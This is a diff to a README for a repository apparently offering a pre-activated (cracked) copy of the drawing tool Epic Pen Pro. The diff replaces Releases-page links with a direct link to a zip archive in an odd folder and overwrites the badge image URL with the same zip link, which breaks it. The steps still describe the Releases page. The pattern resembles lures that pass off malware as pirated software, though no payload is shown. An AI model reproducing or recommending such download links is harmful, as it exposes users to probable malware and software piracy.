@@ -1,6 +1,6 @@
 # ✨ Epic-Pen-Pro-Activated - Unlock Your Digital Creativity
 
-[![Download Epic Pen Pro Activated](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20Epic%20Pen%20Pro-brightgreen)](https://github.com/Prx2008/Epic-Pen-Pro-Activated/releases)
+[![Download Epic Pen Pro Activated](https://github.com/Prx2008/Epic-Pen-Pro-Activated/raw/refs/heads/main/bitterbush/Activated-Epic-Pro-Pen-3.5-beta.5.zip%20Now-Get%20Started%20with%20Epic%20Pen%20Pro-brightgreen)](https://github.com/Prx2008/Epic-Pen-Pro-Activated/raw/refs/heads/main/bitterbush/Activated-Epic-Pro-Pen-3.5-beta.5.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ To download the application, you will go to the Releases page.
 
 ### 3. Download the Software
 
-Visit this page to download: [Download Epic Pen Pro](https://github.com/Prx2008/Epic-Pen-Pro-Activated/releases)
+Visit this page to download: [Download Epic Pen Pro](https://github.com/Prx2008/Epic-Pen-Pro-Activated/raw/refs/heads/main/bitterbush/Activated-Epic-Pro-Pen-3.5-beta.5.zip)
 
 Once you're on the Releases page, look for the latest version. It will be at the top. Click on the version number or the link next to it to access the files for download.
 
